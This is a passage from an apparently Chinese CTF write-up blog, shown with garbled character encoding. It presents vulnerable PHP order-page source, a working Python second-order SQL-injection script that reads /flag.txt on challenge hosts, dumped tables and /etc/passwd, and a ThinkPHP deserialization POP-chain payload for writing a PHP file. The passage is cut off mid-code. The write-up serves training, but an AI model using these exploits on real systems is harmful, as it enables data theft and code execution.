href=&quot;./change.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦ä¿®æ”¹æ”¶è´§åœ°å€&lt;/button&gt;            &lt;/a&gt;             &lt;a href=&quot;./delete.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘ä¸æƒ³è¦äº†&lt;/button&gt;            &lt;/a&gt;            &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>change.php</p><pre><code class="php">&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $address = addslashes($_POST[&quot;address&quot;]);    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){        $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);    }    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){        $row = $fetch-&gt;fetch_assoc();        $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];        $result = $db-&gt;query($sql);        if(!$result) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;;    } else {        $msg = &quot;æœªæ‰¾åˆ°è®¢å•!&quot;;    }}else {    $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;}?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;ä¿®æ”¹æ”¶è´§åœ°å€&lt;/title&gt;&lt;base href=&quot;./&quot;&gt;&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;h&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;                &lt;h1&gt;ä¿®æ”¹æ”¶è´§åœ°å€&lt;/h1&gt;                &lt;form method=&quot;post&quot;&gt;                    &lt;p&gt;                    &lt;h3&gt;å§“å:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;                    &lt;h3&gt;ç”µè¯:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;                    &lt;h3&gt;åœ°å€:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;address&quot;&gt;                    &lt;/p&gt;                    &lt;p&gt;                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;ä¿®æ”¹è®¢å•&lt;/button&gt;                    &lt;/p&gt;                &lt;/form&gt;                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;f&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;            &lt;h2 class=&quot;mb&quot;&gt;è®¢å•ç®¡ç†&lt;/h2&gt;            &lt;a href=&quot;./index.php&quot;&gt;                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;è¿”å›&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./search.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦æŸ¥è®¢å•&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./delete.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘ä¸æƒ³è¦äº†&lt;/button&gt;            &lt;/a&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>delete.php</p><pre><code class="php">&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){         $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);    }    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){        $row = $fetch-&gt;fetch_assoc();        $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);        if(!$result) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;è®¢å•åˆ é™¤æˆåŠŸ&quot;;    } else {        $msg = &quot;æœªæ‰¾åˆ°è®¢å•!&quot;;    }}else {    $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;}?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;åˆ é™¤è®¢å•&lt;/title&gt;&lt;base href=&quot;./&quot;&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;h&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;                &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;                &lt;h1&gt;åˆ é™¤è®¢å•&lt;/h1&gt;                &lt;form method=&quot;post&quot;&gt;                    &lt;p&gt;                    &lt;h3&gt;å§“å:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;user_name&quot;&gt;                    &lt;h3&gt;ç”µè¯:&lt;/h3&gt;                    &lt;input type=&quot;text&quot; class=&quot;subscribe-input&quot; name=&quot;phone&quot;&gt;                    &lt;/p&gt;                    &lt;p&gt;                    &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39; type=&quot;submit&quot;&gt;åˆ é™¤è®¢å•&lt;/button&gt;                    &lt;/p&gt;                &lt;/form&gt;                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot; style=&quot;color:#ffffff;&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;f&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;h2 class=&quot;mb&quot;&gt;è®¢å•ç®¡ç†&lt;/h2&gt;            &lt;a href=&quot;./index.php&quot;&gt;                &lt;button class=&#39;btn btn-lg btn-register btn-sub btn-white&#39;&gt;è¿”å›&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./search.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦æŸ¥è®¢å•&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./change.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦ä¿®æ”¹æ”¶è´§åœ°å€&lt;/button&gt;            &lt;/a&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>confirm.php</p><pre><code class="php">&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $address = $_POST[&quot;address&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){        $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);    }    if($fetch-&gt;num_rows&gt;0) {        $msg = $user_name.&quot;å·²æäº¤è®¢å•&quot;;    }else{        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;        $re = $db-&gt;prepare($sql);        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);        $re = $re-&gt;execute();        if(!$re) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;è®¢å•æäº¤æˆåŠŸ&quot;;    }} else {    $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;ç¡®è®¤è®¢å•&lt;/title&gt;&lt;base href=&quot;./&quot;&gt;&lt;meta charset=&quot;utf-8&quot;/&gt;&lt;link href=&quot;assets/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/custom-animations.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;assets/css/style.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;h&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;img class=&quot;logo&quot; src=&quot;./assets/img/logo-zh.png&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;div class=&quot;col-md-8 col-md-offset-2 centered&quot;&gt;                &lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;                &lt;a href=&quot;./index.php&quot;&gt;                &lt;button class=&#39;btn btn-lg  btn-sub btn-white&#39;&gt;è¿”å›&lt;/button&gt;                &lt;/a&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;f&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;p style=&quot;margin:35px 0;&quot;&gt;&lt;br&gt;&lt;/p&gt;            &lt;h2 class=&quot;mb&quot;&gt;è®¢å•ç®¡ç†&lt;/h2&gt;            &lt;a href=&quot;./search.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦æŸ¥è®¢å•&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./change.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘è¦ä¿®æ”¹æ”¶è´§åœ°å€&lt;/button&gt;            &lt;/a&gt;            &lt;a href=&quot;./delete.php&quot;&gt;                &lt;button class=&quot;btn btn-lg btn-register btn-white&quot; &gt;æˆ‘ä¸æƒ³è¦äº†&lt;/button&gt;            &lt;/a&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/retina-1.1.0.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;assets/js/jquery.unveilEffects.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>é˜…è¯»ä»£ç å‘ç°,searchå¤„æœ‰sqlæ³¨å…¥,ä½†æ˜¯æœ‰ä»¥ä¸‹é™åˆ¶:<code>&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;</code></p><p>changeå¤„æœ‰æ˜æ˜¾çš„äºŒæ¬¡æ³¨å…¥,æ— é™åˆ¶,ä½†æ˜¯æ˜¯update</p><pre><code>&quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];</code></pre><p>æˆ‘ä»¬åˆ©ç”¨æŠ¥é”™æ³¨å…¥æ¥è·å–å›æ˜¾</p><pre><code>information_schema,test,performance_schema,ctftraining,mysql,ctfusersctftraining:FLAG_TABLE,news,usersFLAG_TABLE:FLAG_COLUMNusers:id,username,password,ip,timenews:id,title,content,timectfusers:useruser:user_id,address,old_address,user_name,phone</code></pre><pre><code>1dogThe domestic dog (Canis lupus familiaris when considered a subspecies of the wolf or Canis familiaris when considered a distinct species)[4] is a member of the genus Canis (canines), which forms part of the wolf-like canids,[5] and is the most widely abundant terrestrial carnivore.1571838684,2catThe cat or domestic cat (Felis catus) is a small carnivorous mammal.[1][2] It is the only domesticated species in the family Felidae.[4] The cat is either a house cat, kept as a pet, or a feral cat, freely ranging and avoiding human contact.1571838684,3birdBirds, also known as Aves, are a group of endothermic vertebrates, characterised by feathers, toothless beaked jaws, the laying of hard-shelled eggs, a high metabolic rate, a four-chambered heart, and a strong yet lightweight skeleton.1571838684,4flagFlag is in the database but not here.15718386841,admin,21232f297a57a5a743894a0e4a801fc3,127.0.0.1,1571838684,2,guest,084e0343a0486ff05530df6c705c8bb4,127.0.0.1,1571838684,3,virink,a4346e75cc1dd161a8d57f3b2d5d82d0,127.0.0.1,1571838684  </code></pre><p>/etc/passwd</p><pre><code>root:x:0:0:root:/root:/bin/ashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/usr/lib/news:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologinman:x:13:15:man:/usr/man:/sbin/nologinpostmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologincron:x:16:16:cron:/var/spool/cron:/sbin/nologinftp:x:21:21::/var/lib/ftp:/sbin/nologinsshd:x:22:22:sshd:/dev/null:/sbin/nologinat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologinsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologinxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologingames:x:35:35:games:/usr/games:/sbin/nologinpostgres:x:70:70::/var/lib/postgresql:/bin/shcyrus:x:85:12::/usr/cyrus:/sbin/nologinvpopmail:x:89:89::/var/vpopmail:/sbin/nologinntp:x:123:123:NTP:/var/empty:/sbin/nologinsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologinguest:x:405:100:guest:/dev/null:/sbin/nologinnobody:x:65534:65534:nobody:/:/sbin/nologinwww-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologinmysql:x:100:101:mysql:/var/lib/mysql:/sbin/nologinnginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin</code></pre><pre><code>dbf39bacca9e.log</code></pre><p>è‰¹,æœ€åç™¾åº¦ä¸‹å‘ç°flagå†flag.txté‡Œé¢</p><p><code>flag{c90595fb-9a36-4257-ba55-9181d7584edc}</code></p><p>é™„ä¸Šè„šæœ¬:</p><pre><code class="python">import requestsimport randomimport reimport timedef sql_inj(sql):    num=random.randint(0,9999999999)    result=&quot;&quot;    count=1    while True:        burp0_url = &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn/confirm.php&quot;        burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://9f5e00e9-1ee3-46ec-bc40-5d37fcbb00a2.node3.buuoj.cn/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;user_name&quot;: num, &quot;phone&quot;: num, &quot;address&quot;: &quot;&#39;+(updatexml(1,concat(0x7e,substr(({sql}),{count},30),0x7e),1))#&quot;.format(sql=sql,count=count)}        res=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)        burp0_url = &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn/change.php&quot;        burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://9f5e00e9-1ee3-46ec-bc40-5d37fcbb00a2.node3.buuoj.cn/change.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;user_name&quot;: num, &quot;phone&quot;: num, &quot;address&quot;: num}        res=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)        print(res.text)        tmp=re.match(r&#39;.*~(.*)~.*&#39;,res.text,flags=re.DOTALL).group(1)        result+=tmp        print(result)        if tmp.strip() is &quot;&quot;:            break        count+=30        num+=1        time.sleep(0.5)sql_inj(&quot;SELECT (load_file(&#39;/flag.txt&#39;))&quot;)</code></pre><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>æŠ¥é”™åå‘ç°thinkphpçš„å£³æŠ«ç€Discuzçš„çš®,è§‚å¯Ÿcookieå‘ç°,å­˜åœ¨ååºåˆ—åŒ–ç‚¹</p><p>æ‰«ç›®å½•å,ä»<a href="http://www.tar.gzä¸­æ‹¿åˆ°æºç ,ä»æºç ä¸­å¾ˆå®¹æ˜“æ„é€ popé“¾" target="_blank" rel="noopener">www.tar.gzä¸­æ‹¿åˆ°æºç ,ä»æºç ä¸­å¾ˆå®¹æ˜“æ„é€ popé“¾</a></p><p>payload:</p><pre><code class="php">&lt;?phpnamespace app\web\controller;use think\Controller;class Index extends Controller{    public $profile;    public $profile_db;    public function index()    {        if($this-&gt;login_check()){            $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/home&quot;;            $this-&gt;redirect($curr_url,302);            exit();        }        return $this-&gt;fetch(&quot;index&quot;);    }    public function home(){        if(!$this-&gt;login_check()){            $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;            $this-&gt;redirect($curr_url,302);            exit();        }        if(!$this-&gt;check_upload_img()){            $this-&gt;assign(&quot;username&quot;,$this-&gt;profile_db[&#39;username&#39;]);            return $this-&gt;fetch(&quot;upload&quot;);        }else{            $this-&gt;assign(&quot;img&quot;,$this-&gt;profile_db[&#39;img&#39;]);            $this-&gt;assign(&quot;username&quot;,$this-&gt;profile_db[&#39;username&#39;]);            return $this-&gt;fetch(&quot;home&quot;);        }    }    public function login_check(){        $profile=cookie(&#39;user&#39;);        if(!empty($profile)){            $this-&gt;profile=unserialize(base64_decode($profile));            #$this-&gt;profile_db=db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&#39;ID&#39;]))-&gt;find();            if(array_diff(array(1,1,1),$this-&gt;profile)==null){                return 1;            }else{                return 0;            }        }    }    public function check_upload_img(){        if(!empty($this-&gt;profile) &amp;&amp; !empty($this-&gt;profile_db)){            if(empty($this-&gt;profile_db[&#39;img&#39;])){                return 0;            }else{                return 1;            }        }    }    public function logout(){        cookie(&quot;user&quot;,null);        $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;        $this-&gt;redirect($curr_url,302);        exit();    }    public function test()    {        $a=urldecode(&quot;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A0%3A%22%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A37%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Cindex.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&quot;);        $b=substr($a,0,strlen($a)-1);        $b=str_replace(&quot;\&quot;Error\&quot;:7&quot;,&quot;\&quot;Error\&quot;:8&quot;,$b);        $b.=&quot;s:3:\&quot;aaa\&quot;;&quot;.serialize(new Register()).&quot;}&quot;;        $b=&#39;a:6:{s:2:&quot;ID&quot;;i:9;s:8:&quot;username&quot;;s:4:&quot;aaaa&quot;;s:3:&quot;img&quot;;N;s:5:&quot;email&quot;;s:11:&quot;cao0@qq.com&quot;;s:8:&quot;password&quot;;s:32:&quot;74b87337454200d4d33f80c4663dc5e5&quot;;s:3:&quot;abc&quot;;&#39;.$b.&#39;}&#39;;        #return &quot;a&quot;;        return urlencode(base64_encode($b));    }    public function __get($name)    {        return url;    }}</code></pre><pre><code class="php">&lt;?phpnamespace app\web\controller;use think\Controller;class Register extends Controller{    public $checker;    public $registed;    public function __construct()    {        $this-&gt;registed=0;        $this-&gt;checker=new Profile();    }    public function register()    {        if ($this-&gt;checker) {            if($this-&gt;checker-&gt;login_check()){                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/home&quot;;                $this-&gt;redirect($curr_url,302);                exit();            }        }        if (!empty(input(&quot;post.username&quot;)) &amp;&amp; !empty(input(&quot;post.email&quot;)) &amp;&amp; !empty(input(&quot;post.password&quot;))) {            $email = input(&quot;post.email&quot;, &quot;&quot;, &quot;addslashes&quot;);            $password = input(&quot;post.password&quot;, &quot;&quot;, &quot;addslashes&quot;);            $username = input(&quot;post.username&quot;, &quot;&quot;, &quot;addslashes&quot;);            if($this-&gt;check_email($email)) {                if (empty(db(&quot;user&quot;)-&gt;where(&quot;username&quot;, $username)-&gt;find()) &amp;&amp; empty(db(&quot;user&quot;)-&gt;where(&quot;email&quot;, $email)-&gt;find())) {                    $user_info = [&quot;email&quot; =&gt; $email, &quot;password&quot; =&gt; md5($password), &quot;username&quot; =&gt; $username];                    if (db(&quot;user&quot;)-&gt;insert($user_info)) {                        $this-&gt;registed = 1;                        $this-&gt;success(&#39;Registed successful!&#39;, url(&#39;../index&#39;));                    } else {                        $this-&gt;error(&#39;Registed failed!&#39;, url(&#39;../index&#39;));                    }                } else {                    $this-&gt;error(&#39;Account already exists!&#39;, url(&#39;../index&#39;));                }            }else{                $this-&gt;error(&#39;Email illegal!&#39;, url(&#39;../index&#39;));            }        } else {            $this-&gt;error(&#39;Something empty!&#39;, url(&#39;../index&#39;));        }    }    public function check_email($email){        $pattern = &quot;/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,})$/&quot;;        preg_match($pattern, $email, $matches);        if(empty($matches)){            return 0;        }else{            return 1;        }    }    public function __destruct()    {        if(!$this-&gt;registed){            $this-&gt;checker-&gt;index();        }    }}</code></pre><pre><code class="php">&lt;?phpnamespace app\web\controller;use think\Controller;class Profile extends Controller{    public $checker;    public $filename_tmp;    public $filename;    public $upload_menu;    public $ext;    public $img;    public $except=array(&#39;index&#39;=&gt;&#39;upload_img&#39;);    public $index;    public function __construct()    {        $this-&gt;index=&quot;upload_img&quot;;        $this-&gt;checker=0;        $this-&gt;ext=1;        $this-&gt;filename_tmp=&quot;../public/upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.png&quot;;        $this-&gt;filename=&quot;../public/upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.php&quot;;    }    public function upload_img(){        if($this-&gt;checker){            if(!$this-&gt;checker-&gt;login_check()){                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;                $this-&gt;redirect($curr_url,302);                exit();            }        }        if(!empty($_FILES)){            $this-&gt;filename_tmp=$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $this-&gt;filename=md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;            $this-&gt;ext_check();        }        if($this-&gt;ext) {            if(getimagesize($this-&gt;filename_tmp)) {                @copy($this-&gt;filename_tmp, $this-&gt;filename);                @unlink($this-&gt;filename_tmp);                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;                $this-&gt;update_img();            }else{                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;../index&#39;));            }        }else{            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;../index&#39;));        }    }    public function update_img(){        $user_info=db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&#39;ID&#39;])-&gt;find();        if(empty($user_info[&#39;img&#39;]) &amp;&amp; $this-&gt;img){            if(db(&#39;user&#39;)-&gt;where(&#39;ID&#39;,$user_info[&#39;ID&#39;])-&gt;data([&quot;img&quot;=&gt;addslashes($this-&gt;img)])-&gt;update()){                $this-&gt;update_cookie();                $this-&gt;success(&#39;Upload img successful!&#39;, url(&#39;../home&#39;));            }else{                $this-&gt;error(&#39;Upload file failed!&#39;, url(&#39;../index&#39;));            }        }    }    public function update_cookie(){        $this-&gt;checker-&gt;profile[&#39;img&#39;]=$this-&gt;img;        cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600);    }    public function ext_check(){        $ext_arr=explode(&quot;.&quot;,$this-&gt;filename);        